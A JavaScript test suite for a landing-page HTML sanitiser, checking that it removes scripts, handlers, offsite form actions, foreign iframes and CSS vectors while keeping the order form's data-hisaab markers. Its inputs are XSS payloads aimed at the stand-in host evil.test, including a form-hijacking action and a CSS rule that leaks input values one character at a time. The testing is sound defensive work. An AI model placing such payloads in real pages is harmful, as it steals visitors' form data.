/**
 * The landing page sanitiser, against hostile input.
 *
 * This guards the largest attack surface the platform has: raw HTML, possibly
 * written by a language model, served from our own origin to strangers who
 * clicked an advertisement. Everything below is a payload that must not survive
 * a save (I-15).
 *
 * Two properties are tested with equal weight, because a sanitiser that fails
 * either one is useless:
 *
 *   it must REMOVE what is dangerous — scripts, handlers, javascript: URLs,
 *     unframeable iframes, CSS exfiltration.
 *   it must KEEP what the feature needs — `data-hisaab-*` markers, classes,
 *     inline styles, the order form. A sanitiser that strips the contract
 *     produces a page that renders beautifully and takes no orders.
 */

const {
  sanitizeLandingHtml,
  filterCss,
  isAllowedIframe,
  isAllowedAssetUrl,
} = require('../utils/landingSanitize.util');

const OWN = ['pub-a711420c4d6c46028d806ba9aea68c7d.r2.dev'];
const clean = (html) => sanitizeLandingHtml(html, { ownHosts: OWN }).html;

describe('script execution is removed', () => {
  test('a <script> tag and its source both go', () => {
    const out = clean('<div>ok<script>alert(1)</script></div>');
    expect(out).not.toMatch(/script/i);
    // The source must not survive as visible prose either — the naive fix
    // (drop the tag, keep the text) prints the payload on the page.
    expect(out).not.toContain('alert(1)');
    expect(out).toContain('ok');
  });

  test.each([
    ['onclick', '<div onclick="steal()">x</div>'],
    ['onerror', '<img src="/a.webp" onerror="steal()">'],
    ['onload', '<div onload="steal()">x</div>'],
    ['onmouseover', '<a onmouseover="steal()">x</a>'],
    ['onfocus', '<input name="phone" onfocus="steal()">'],
  ])('the %s handler is stripped', (_name, html) => {
    const out = clean(html);
    expect(out).not.toMatch(/on[a-z]+=/i);
    expect(out).not.toContain('steal()');
  });

  test('a javascript: href is removed', () => {
    const out = clean('<a href="javascript:steal()">click</a>');
    expect(out).not.toContain('javascript:');
  });

  test('a javascript: href with obfuscating whitespace is still removed', () => {
    const out = clean('<a href="java\tscript:steal()">click</a>');
    expect(out).not.toMatch(/javascript:/i);
  });

  test('data: URLs are refused — size and legacy vectors both', () => {
    const out = clean('<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Pg==">');
    expect(out).not.toContain('data:image');
  });

  test('<noscript>, <object> and <embed> are removed with their contents', () => {
    const out = clean('<object data="x.swf">obj</object><embed src="y"><noscript>ns</noscript>');
    expect(out).not.toMatch(/object|embed|noscript/i);
  });

  test('<base> cannot be used to re-point every relative URL on the page', () => {
    expect(clean('<base href="https://evil.test/">')).not.toMatch(/base/i);
  });
});

describe('the form cannot be pointed offsite', () => {
  test('a form action is stripped', () => {
    const out = clean('<form data-hisaab="order-form" action="https://evil.test/collect" method="post"></form>');
    expect(out).not.toContain('evil.test');
    expect(out).not.toMatch(/action=/i);
    // The form itself survives — it is the feature.
    expect(out).toContain('data-hisaab="order-form"');
  });

  test('REGRESSION: formaction on a button is stripped too', () => {
    // Stripping only the form's own action leaves this bypass wide open: a
    // submit button carries its own target and wins over the form's.
    const out = clean('<form data-hisaab="order-form"><button formaction="https://evil.test/x">Go</button></form>');
    expect(out).not.toContain('evil.test');
    expect(out).not.toMatch(/formaction/i);
  });

  test('formaction on an input is stripped', () => {
    const out = clean('<input type="submit" formaction="https://evil.test/x">');
    expect(out).not.toContain('evil.test');
  });
});

describe('iframes are limited to video hosts', () => {
  test('YouTube is allowed and forced into a sandbox', () => {
    const out = clean('<iframe src="https://www.youtube.com/embed/abc"></iframe>');
    expect(out).toContain('youtube.com/embed/abc');
    expect(out).toContain('sandbox=');
    expect(out).toContain('referrerpolicy="no-referrer"');
  });

  test('an arbitrary host is rejected and REPORTED, not silently dropped', () => {
    const { html, notes } = sanitizeLandingHtml('<iframe src="https://evil.test/x"></iframe>', { ownHosts: OWN });
    expect(html).not.toContain('evil.test/x');
    // Named in the save response — content that vanishes without explanation is
    // how an author concludes the editor is broken.
    expect(notes.rejectedIframes).toEqual(['https://evil.test/x']);
  });

  test('a lookalike host does not pass', () => {
    expect(isAllowedIframe('https://youtube.com.evil.test/x')).toBe(false);
    expect(isAllowedIframe('https://notyoutube.com/x')).toBe(false);
    expect(isAllowedIframe('https://www.youtube.com/embed/x')).toBe(true);
  });

  test('a protocol-relative iframe src does not sneak past', () => {
    const out = clean('<iframe src="//evil.test/x"></iframe>');
    expect(out).not.toContain('evil.test');
  });
});

describe('CSS is kept, but defanged', () => {
  test('@import is stripped and reported', () => {
    const { css, notes } = filterCss('@import url("https://evil.test/x.css"); body{color:red}', OWN);
    expect(css).not.toContain('@import');
    expect(css).toContain('color:red');
    expect(notes).toContain('@import');
  });

  test('REGRESSION: url() to a foreign host is neutralised — the exfiltration channel', () => {
    // The classic attack: an attribute selector plus a background image sends
    // form contents to a third party one character at a time.
    const { css, notes } = filterCss(
      'input[value^="a"]{background:url("https://evil.test/log?c=a")}',
      OWN
    );
    expect(css).not.toContain('evil.test');
    expect(notes[0]).toContain('evil.test');
  });

  test('url() to our own bucket survives', () => {
    const { css } = filterCss(`.hero{background:url("https://${OWN[0]}/platform/a.webp")}`, OWN);
    expect(css).toContain(OWN[0]);
  });

  test('a relative url() survives', () => {
    const { css } = filterCss('.hero{background:url(/img/a.webp)}', OWN);
    expect(css).toContain('/img/a.webp');
  });

  test('Google Fonts survives — a real design dependency', () => {
    const { css } = filterCss('.x{background:url(https://fonts.gstatic.com/f.woff2)}', OWN);
    expect(css).toContain('fonts.gstatic.com');
  });

  test('legacy IE execution vectors are removed', () => {
    const { css } = filterCss('.x{width:expression(alert(1));behavior:url(#evil)}', OWN);
    expect(css).not.toMatch(/\bexpression\s*\(/);
    expect(css).not.toMatch(/(^|[;{\s])behavior\s*:/);
  });

  test('a <style> block survives the full pipeline, filtered', () => {
    const { html } = sanitizeLandingHtml(
      '<style>@import "https://evil.test/x.css"; .hero{color:red}</style><div class="hero">x</div>',
      { ownHosts: OWN }
    );
    expect(html).toContain('.hero{color:red}');
    expect(html).not.toContain('@import');
  });

  test('an inline style attribute is filtered the same way', () => {
    const { html } = sanitizeLandingHtml(
      '<div style="background:url(https://evil.test/log)">x</div>',
      { ownHosts: OWN }
    );
    expect(html).not.toContain('evil.test');
    expect(html).toContain('style=');
  });

  test('an inline style that is harmless is left alone', () => {
    const { html } = sanitizeLandingHtml('<div style="color:#c00;padding:8px">x</div>', { ownHosts: OWN });
    expect(html).toContain('color:#c00');
  });
});

describe('SVG is allowed, but not its dangerous parts', () => {
  test('an icon survives', () => {
    const out = clean('<svg viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="currentColor"/></svg>');
    expect(out).toContain('<svg');
    expect(out).toContain('<path');
  });

  test.each(['use', 'foreignObject', 'script', 'animate'])('svg <%s> is removed', (tag) => {
    const out = clean(`<svg><${tag} href="https://evil.test/x">x</${tag}></svg>`);
    expect(out.toLowerCase()).not.toContain(`<${tag.toLowerCase()}`);
  });
});

describe('what the feature needs is KEPT', () => {
  test('every data-hisaab marker survives', () => {
    // If this fails the page renders and takes no orders — the worst outcome the
    // feature has, and it would look like a content bug rather than a security
    // setting.
    const html = `
      <section data-hisaab-group="হিরো">
        <h1 data-hisaab-edit="hero-title">আম</h1>
        <img data-hisaab-img="hero" src="https://${OWN[0]}/platform/a.webp">
        <form data-hisaab="order-form">
          <input name="customerName" required>
          <input name="phone" required>
          <textarea name="address"></textarea>
          <input type="radio" name="offer" value="5kg">
          <select name="zone"><option value="inside-dhaka">ঢাকা</option></select>
          <button data-hisaab="submit">অর্ডার</button>
        </form>
        <span data-hisaab="total" data-offer-key="5kg"></span>
      </section>`;

    const out = clean(html);
    for (const marker of [
      'data-hisaab-group', 'data-hisaab-edit', 'data-hisaab-img',
      'data-hisaab="order-form"', 'data-hisaab="submit"', 'data-hisaab="total"',
      'data-offer-key',
      'name="customerName"', 'name="phone"', 'name="address"',
      'name="offer"', 'name="zone"', 'value="5kg"', 'value="inside-dhaka"',
    ]) {
      expect(out).toContain(marker);
    }
  });

  test('classes and ids survive — the design depends on them', () => {
    const out = clean('<div class="hero grid-cols-2 md:flex" id="top">x</div>');
    expect(out).toContain('class="hero grid-cols-2 md:flex"');
    expect(out).toContain('id="top"');
  });

  test('an image from our own bucket is not reported as external', () => {
    const { notes } = sanitizeLandingHtml(
      `<img src="https://${OWN[0]}/platform/a.webp">`,
      { ownHosts: OWN }
    );
    expect(notes.externalImages).toEqual([]);
  });

  test('an image from someone else\'s server is reported', () => {
    // Not removed — an ad campaign should not break at save time — but named, so
    // the admin can move it into the library before the other server goes down.
    const { notes } = sanitizeLandingHtml('<img src="https://someones-blog.test/a.jpg">', { ownHosts: OWN });
    expect(notes.externalImages).toEqual(['https://someones-blog.test/a.jpg']);
  });

  test('target=_blank links get noopener', () => {
    const out = clean('<a href="https://example.com" target="_blank">x</a>');
    expect(out).toContain('rel="noopener noreferrer"');
  });

  test('empty and non-string input do not throw', () => {
    expect(sanitizeLandingHtml('', { ownHosts: OWN }).html).toBe('');
    expect(sanitizeLandingHtml(null, { ownHosts: OWN }).html).toBe('');
    expect(sanitizeLandingHtml(undefined).html).toBe('');
  });
});

describe('isAllowedAssetUrl', () => {
  test('relative URLs are ours by definition', () => {
    expect(isAllowedAssetUrl('/img/a.webp', OWN)).toBe(true);
  });

  test('a protocol-relative URL is NOT treated as relative', () => {
    // `//evil.test/x` looks relative and is not — it inherits the page's scheme
    // and loads from another origin.
    expect(isAllowedAssetUrl('//evil.test/x', OWN)).toBe(false);
  });

  test('our own bucket passes, a stranger does not', () => {
    expect(isAllowedAssetUrl(`https://${OWN[0]}/platform/a.webp`, OWN)).toBe(true);
    expect(isAllowedAssetUrl('https://evil.test/a.webp', OWN)).toBe(false);
  });

  test('an empty value is not allowed', () => {
    expect(isAllowedAssetUrl('', OWN)).toBe(false);
    expect(isAllowedAssetUrl(null, OWN)).toBe(false);
  });
});
